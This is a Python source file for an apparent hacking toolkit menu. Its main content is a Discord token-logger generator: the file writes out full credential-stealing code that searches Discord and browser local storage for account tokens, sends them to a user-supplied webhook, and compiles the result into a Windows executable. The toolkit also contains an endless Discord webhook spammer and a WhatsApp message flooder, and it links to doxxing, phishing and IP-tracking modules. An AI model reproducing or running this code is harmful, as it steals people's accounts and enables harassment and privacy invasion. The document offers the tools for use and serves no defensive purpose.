from colorama import Fore  # Used for colored text in the console
import os  # Used for interacting with the operating system (e.g., clearing the screen)
import shutil  # Used for file operations (e.g., moving or deleting files)
import time  # Used for adding delays (e.g., pausing the script)
import requests  # Used for making HTTP requests (e.g., sending messages to a webhook)
import random  # Used for generating random data (e.g., passwords)
import platform  # Used for getting information about the operating system
import keyboard  # Used for simulating keyboard input (e.g., typing messages)
import webbrowser  # Used for opening web pages in a browser
from core import doxxing, goldenphish, ser, scanner  # Imports custom modules for specific tools

local_version = "1.0.1"  # Defines the current version of the script

def clear():
    """Clears the console screen."""
    if os.name == "nt":  # Checks if the operating system is Windows
        os.system("cls")  # Clears the screen in Windows
    else:  # If the operating system is not Windows (e.g., Linux, macOS)
        os.system("clear")  # Clears the screen in other operating systems

def spam():
    """Sends repeated messages to a Discord webhook."""
    clear()  # Clears the console
    print(f"""{Fore.GREEN}
    ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
    ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
    ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ███████╗██████╔╝███████║██╔████╔██║
    ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
    ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
      """)  # Prints a fancy title
    try:
        webhook = input('\n[+] Enter the webhook link: ')  # Asks the user for the Discord webhook URL
        mensaje = input('[+] Enter the message you want to send: ')  # Asks the user for the message
        while True:  # Loops indefinitely
            requests.post(webhook, json={'username': 'Spammer', 'content': mensaje})  # Sends the message to the webhook
            print('\n[~] Sending message...')  # Prints a message indicating that the message is being sent
    except KeyboardInterrupt:  # If the user presses Ctrl+C
        print('\n[~] Stopping spam...')  # Prints a message indicating that the spam is being stopped
        time.sleep(1)  # Pauses for 1 second
        menu()  # Returns to the main menu

def tools():
    """Displays and handles a menu for various tools."""
    clear()
    print(f"""{Fore.BLUE}
                                 ███      ▄██████▄   ▄██████▄   ▄█          ▄████████ 
                             ▀█████████▄ ███    ███ ███    ███ ███         ███    ███ 
                                ▀███▀▀██ ███    ███ ███    ███ ███         ███    █▀  
                                 ███   ▀ ███    ███ ███    ███ ███         ███        
                                 ███     ███    ███ ███    ███ ███       ▀███████████ 
                                 ███     ███    ███ ███    ███ ███                ███ 
                                 ███     ███    ███ ███    ███ ███▌    ▄    ▄█    ███ 
                                ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██  ▄████████▀  
                                          ▀                      
     |------------------------------------------------------------------------------------------|
     |                                                                                          |    
     | [1] Doxxing Tools                                                                        |
     | [2] Phishing Tools                                                                       |
     | [00] Return to main menu                                                          |
     | [99] Exit                                                                               |
     |------------------------------------------------------------------------------------------|
    """)
    a = input('\nroot@fuckyou:~# ')
    if a == "1":
        doxxing.doxxer()  # Calls the doxxer function from the 'doxxing' module
    elif a == "2":
        goldenphish.phish()  # Calls the phish function from the 'goldenphish' module
    elif a == "00":
        menu()  # Returns to the main menu
    elif a == "99":
        exit()  # Exits the script
    else:
        print(f'\n{Fore.RED}[!] Invalid option.')  # Prints an error message
        time.sleep(2)  # Pauses for 2 seconds
        tools()  # Redisplays the tools menu

def creds():
    """Displays the credits for the script."""
    clear()
    print(f'''{Fore.MAGENTA}
                             ______   _        _     __   __          _ 
                             |  ___/\| |/\    | |    \ \ / /         | |
                             | |_  \ ` ' / ___| | __  \ V /___  _   _| |
                             |  _||_     _/ __| |/ /   \ // _ \| | | | |
                             | |   / , . \ (__|   <    | | (_) | |_| |_|
                             \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
                             -------------------------------------------------|
                             |              |    CREDITS   |                 |
                             |              |---------------|                 |
                             |                                                |
                             | [~] Fuck You created by:                        |
                             |                                                |
                             |   [$] Spyk3r                                   |
                             |   Discord:                                     |
                             |   ! Spyk3r#0614                                |
                             |   Twitter:                                     |
                             |   https://twitter.com/_Spyk33r_                |
                             |   Github:                                      |
                             |   https://github.com/Spyk3r                    |
                             |                                                |
                             |   [$] Euronymou5                               |
                             |   Discord:                                     |
                             |   Euronymou5#3155                              |
                             |   Twitter:                                     |
                             |   https://twitter.com/Euronymou51              |
                             |   Github:                                      |
                             |   https://github.com/Euronymou5                |
                             |------------------------------------------------|
    ''')
    input('\n[~] Press enter to continue...')  # Waits for the user to press Enter
    menu()  # Returns to the main menu

def tracker():
    """Runs the IP tracker script."""
    if os.name == "nt":
        os.system("python track/omega.py")  # Runs the IP tracker on Windows
    else:
        os.system("python3 track/omega.py")  # Runs the IP tracker on other systems

def waspam():
    """Sends repeated messages on WhatsApp Web."""
    clear()
    print(f"""{Fore.MAGENTA}
      __          ___           _                                          _             
      \ \        / / |         | |         /\                             | |            
       \ \  /\  / /| |__   __ _| |_ ___   /  \   _ __  _ __    _ __  _   _| | _____ _ __ 
        \ \/  \/ / | '_ \ / _` | __/ __/ / /\ \ | '_ \| '_ \  | '_ \| | | | |/ / _ \ '__|
         \  /\  /  | | | | (_| | |_\__ \/ ____ \| |_) | |_) | | | | | |_| |   <  __/ |   
          \/  \/   |_| |_|\__,_|\__|___/_/    \_\ .__/| .__/  |_| |_|\__,_|_|\_\___|_|   
                                                | |   | |                                
                                                |_|   |_|                               
    """)
    print('\n[~] Opening WhatsApp...')
    webbrowser.open_new_tab('https://web.whatsapp.com/')  # Opens WhatsApp Web in a new tab
    input(f'\n{Fore.YELLOW}[~] Once inside WhatsApp Web, scan the QR code and press enter...')  # Prompts the user to scan the QR code
    mensaje = input(f'\n{Fore.BLUE}[~] Enter the message you want to send: ')  # Asks for the message
    if mensaje == "" or mensaje == " ":  # Checks if the message is empty
        print(f'\n{Fore.RED}[!] Error: You must enter a message.')  # Prints an error
        time.sleep(3)  # Pauses
        waspam()  # Restarts the function
    else:
        cantidad = int(input(f'\n{Fore.BLUE}[~] Enter the number of messages you want to send: '))  # Asks for the number of messages
        if cantidad == 0:  # Checks if the number is zero
            print(f'\n{Fore.RED}[!] Error: You must enter a number.')  # Prints an error
            time.sleep(3)  # Pauses
            waspam()  # Restarts the function
        elif cantidad <= 0:  # Checks if the number is negative
            print(f'\n{Fore.RED}[!] Error: You must enter a valid number.')  # Prints an error
            time.sleep(3)  # Pauses
            waspam()  # Restarts the function
        else:
            print('\n[~] The message will be sent in 5 seconds, remember to enter the chat you want to nuke...')  # Warns the user
            time.sleep(5)  # Pauses for 5 seconds
            for _ in range(cantidad):  # Loops the specified number of times
                print('\n[~] Sending message...')  # Prints a message
                keyboard.write(mensaje)  # Types the message
                keyboard.press_and_release('enter')  # Presses Enter
            menu()  # Returns to the main menu

def tokenlogger():
    """Creates and compiles a Discord token logger."""
    clear()
    print(f"""{Fore.LIGHTBLUE_EX}
     ████████  ██████  ██   ██ ███████ ███    ██ ██       ██████   ██████   ██████  ███████ ██████  
        ██    ██    ██ ██  ██  ██      ████   ██ ██      ██    ██ ██       ██       ██      ██   ██ 
        ██    ██    ██ █████   █████   ██ ██  ██ ██      ██    ██ ██   ███ ██   ███ █████   ██████  
        ██    ██    ██ ██  ██  ██      ██  ██ ██ ██      ██    ██ ██    ██ ██    ██ ██      ██   ██ 
        ██     ██████  ██   ██ ███████ ██   ████ ███████  ██████   ██████   ██████  ███████ ██   ██
    """)
    if os.path.isfile('logger.py'):  # Checks if a logger.py file already exists
        os.remove('logger.py')  # Deletes the existing file
    else:
        pass  # Does nothing if the file doesn't exist
    variable_hook = input(f'\n{Fore.GREEN}[~] Enter your Discord WebHook: ')  # Asks for the Discord webhook URL
    f = open('logger.py', 'w')  # Creates a new logger.py file
    f.write('''import os
    if os.name != "nt":
        exit()
    import os
    import re
    import json
    from urllib.request import Request, urlopen

    WEBHOOK = 'webnook'

    PING_ME = True

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + r'\\Discord',
            'Discord Canary': roaming + r'\\discordcanary',
            'Discord PTB': roaming + r'\\discordptb',
            'Google Chrome': local + r'\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + r'\\Opera Software\\Opera Stable',
            'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\\n**{platform}**\\n```\\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\\n'
                else:
                    message += 'No tokens found.\\n'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': message})

        try:
            req = Request(WEBHOOK, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
            pass

    if __name__ == '__main__':
        main()'''.replace("webnook", variable_hook))  # Writes the token logger code to the file, replacing 'webnook' with the user's webhook
    f.close()  # Closes the file
    print(f'\n{Fore.YELLOW}[~] Compiling token logger...')  # Informs the user that the logger is being compiled
    time.sleep(2)  # Pauses for 2 seconds
    print(f'\n{Fore.YELLOW}[~] Detecting OS...')  # Informs the user that the OS is being detected
    if platform.system() == "Linux":  # Checks if the OS is Linux
        print(
            f'\n{Fore.RED}[✘] It is not possible to compile a .exe for Linux, aborting...'
        )  # Informs the user that compiling for Linux is not possible
        time.sleep(2)  # Pauses
        menu()  # Returns to the main menu
    elif platform.system() == "Darwin":  # Checks if the OS is macOS
        print(
            f'\n{Fore.RED}[✘] It is not possible to compile a .exe for MAC OS, aborting...'
        )  # Informs the user that compiling for macOS is not possible
        time.sleep(2)  # Pauses
        menu()  # Returns to the main menu
    elif platform.system() == "Windows":  # Checks if the OS is Windows
        print(f'\n[✔] OS Detected: Windows')  # Confirms that Windows is detected
        ques = input('\n[?] Do you want to add an icon to your .exe? [Y/n]: ')  # Asks if the user wants to add an icon
        if ques == "Y" or ques == "y":  # If the user answers yes
            print('\n[~] Example: C:\\Users\\Desktop\\icon.ico')  # Shows an example path
            icon = input('\n[~] Enter the location of your .ico file: ')  # Asks for the icon path
            if len(icon) == 0:  # Checks if the path is empty
                print(f'\n{Fore.RED}[✘] Error: You must enter a location.')  # Prints an error
                time.sleep(2)  # Pauses
                menu()  # Returns to the main menu
            else:
                os.system(f'pyinstaller --onefile --icon="{icon}" logger.py')  # Compiles the logger with the specified icon
                print(
                    f'\n{Fore.GREEN}[✔] Token logger compiled successfully.')  # Confirms successful compilation
                os.remove("logger.spec")  # Removes a temporary file
                shutil.rmtree('build')  # Removes a temporary directory
                shutil.move("dist/logger.exe", "output")  # Moves the compiled executable
                shutil.rmtree('dist')  # Removes another temporary directory
                print(f'{Fore.GREEN}\n[~] Token logger moved to the folder: output/logger.exe')  # Informs the user of the location
                time.sleep(3)  # Pauses
                menu()  # Returns to the main menu
        elif ques == "N" or ques == "n":  # If the user answers no
            print('\n[~] Converting token logger to exe...')  # Informs the user about the conversion
            os.system("pyinstaller -y -F logger.py")  # Compiles the logger without an icon
            print(f'\n{Fore.GREEN}[✔] Token logger compiled successfully.')  # Confirms successful compilation
            time.sleep(5)  # Pauses
            os.remove("logger.spec")  # Removes a temporary file
            shutil.rmtree('build')  # Removes a temporary directory
            shutil.move("dist/logger.exe", "output")  # Moves the compiled executable
            shutil.rmtree('dist')  # Removes another temporary directory
            print(f'{Fore.GREEN}\n[~] Token logger moved to the folder: output/logger.exe')  # Informs the user of the location
            time.sleep(3)  # Pauses
            menu()  # Returns to the main menu
        else:
            print(f'{Fore.RED}[✘] Error: Invalid option.')  # Prints an error
            time.sleep(2)  # Pauses
            menu()  # Returns to the main menu
    else:
        print(f'{Fore.RED}[!] Error: Unknown OS.')  # Prints an error for unknown OS
        time.sleep(2)  # Pauses
        menu()  # Returns to the main menu

def gen():
    """Generates a random password."""
    clear()
    print(f"""{Fore.LIGHTCYAN_EX}
     ....................../´¯/)             
     ....................,/¯../
     .................../..../
     ............./´¯/'...'/´¯¯`·¸
     ........../'/.../..../......./¨¯\\
     ........('(...´...´.... ¯~/'...)
      .........\.................'...../
       ..........''...\.......... _.·´
        ............\..............(
         ..............\.............\...
    """)
    tam = int(input(f'\n{Fore.YELLOW}[~] Enter the password length (Maximum 77): '))  # Asks for the password length
    if tam == 77:  # Checks if the length is 77
        print(f'\n{Fore.RED}[!] Error: The password can only have a length less than 77.')  # Prints an error
        time.sleep(3)  # Pauses
        gen()  # Restarts the function
    elif tam <= 77:  # Checks if the length is less than or equal to 77
        caracter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&*(){}[]/\?!@#$abcdefghijklmnopqrstuvwxyz"  # Defines the characters to use
        contra = "".join(random.sample(caracter, tam))  # Generates the random password
        print(f'\n{Fore.GREEN}[~] Generated password: {contra}')  # Prints the generated password
        input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')  # Waits for the user to press Enter
        menu()  # Returns to the main menu
    elif tam >= 77:  # Checks if the length is greater than or equal to 77
        print(f'\n{Fore.RED}[!] Error: The password can only have a length less than 77.')  # Prints an error
        time.sleep(3)  # Pauses
        gen()  # Restarts the function

def menu():
    """Displays the main menu and handles user input."""
    clear()
    print(f'''{Fore.LIGHTCYAN_EX}
                             ______   _        _     __   __          _ 
                             |  ___/\| |/\    | |    \ \ / /         | |
                             | |_  \ ` ' / ___| | __  \ V /___  _   _| |
                             |  _||_     _/ __| |/ /   \ // _ \| | | | |
                             | |   / , . \ (__|   <    | | (_) | |_| |_|
                             \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
                                                     v1.0.1 by: Euronymou5 and Spyk3r{Fore.LIGHTBLUE_EX} 
     |-----------------------------------------------------------------------------------------------------------------|
     |                                           |     MENU      |                                                     |
     |                                           |---------------|                                                     |
     |                                                                                                                 |
     |________________$$$$$                            [1] Token Logger Creator discord                                |
     |______________$$____$$                           [2] IP Tracker                                                  |
     |______________$$____$$                           [3] WebHook Spam Discord                                        |
     |______________$$____$$                           [4] Tools Installer                                             |
     |______________$$____$$                           [5] User Searcher                                               |
     |______________$$____$$                           [6] Scanner Con Nmap                                            |  
     |__________$$$$$$____$$$$$$                       [7] Generate Passwords                                         |
     |________$$____$$____$$____$$$$                   [8] WhatsApp Nuker                                              |
     |________$$____$$____$$____$$__$$                 [00] Credits                                                   |
     |$$$$$$__$$____$$____$$____$$____$$               [98] Update Checker                                             |
     |$$____$$$$________________$$____$$               [99] Exit                                                      |
     |$$______$$______________________$$                                                                               |
     |__$$____$$______________________$$                                                                               |
     |___$$$__$$______________________$$                                                                               |
     |____$$__________________________$$                                                                               |
     |_____$$$________________________$$                                                                               |
     |______$$______________________$$$                                                                                |
     |_______$$$____________________$$                                                                                 |
     |________$$____________________$$                                                                                 |
     |_________$$$________________$$$                                                                                  |
     |__________$$________________$$                                                                                   |
     |__________$$$$$$$$$$$$$$$$$$$$                                                                                   |
     |-----------------------------------------------------------------------------------------------------------------|
    ''')
    prompt = input(f'\n{Fore.RESET}root@fuckyou:~# ')  # Asks the user for input
    if prompt == "1":
        tokenlogger()  # Calls the token logger function
    elif prompt == "2":
        tracker()  # Calls the IP tracker function
    elif prompt == "3":
        spam()  # Calls the webhook spam function
    elif prompt == "4":
        tools()  # Calls the tools menu function
    elif prompt == "5":
        ser.ser_menu()  # Calls the user searcher menu function
    elif prompt == "6":
        scanner.scan()  # Calls the Nmap scanner function
    elif prompt == "7":
        gen()  # Calls the password generator function
    elif prompt == "8":
        waspam()  # Calls the WhatsApp nuker function
    elif prompt == "00":
        creds()  # Calls the credits function
    elif prompt == "98":  # Checks for updates
        version = requests.get('https://github.com/Euronymou5/FuckYou/raw/main/version.txt')  # Gets the latest version from GitHub
        if version.status_code == 200:  # Checks if the request was successful
            c = version.text  # Gets the version text
            ola = c.strip()  # Removes any extra whitespace
            if local_version == ola:  # Checks if the local version is the same as the latest version
                print(f'\n{Fore.GREEN}[~] No new versions available.')  # Prints a message
                input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')  # Waits for the user to press Enter
                menu()  # Returns to the main menu
            else:
                print(f'\n{Fore.GREEN}[~] A new version is available: {ola}')  # Prints the new version
                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')  # Waits for the user to press Enter
                menu()  # Returns to the main menu
    elif prompt == "99":
        exit()  # Exits the script
    else:
        print(f'\n{Fore.RED}[!] Error: Invalid option.')  # Prints an error message
        time.sleep(2)  # Pauses for 2 seconds
        menu()  # Redisplays the main menu

menu()  # Starts the script by calling the main menu function
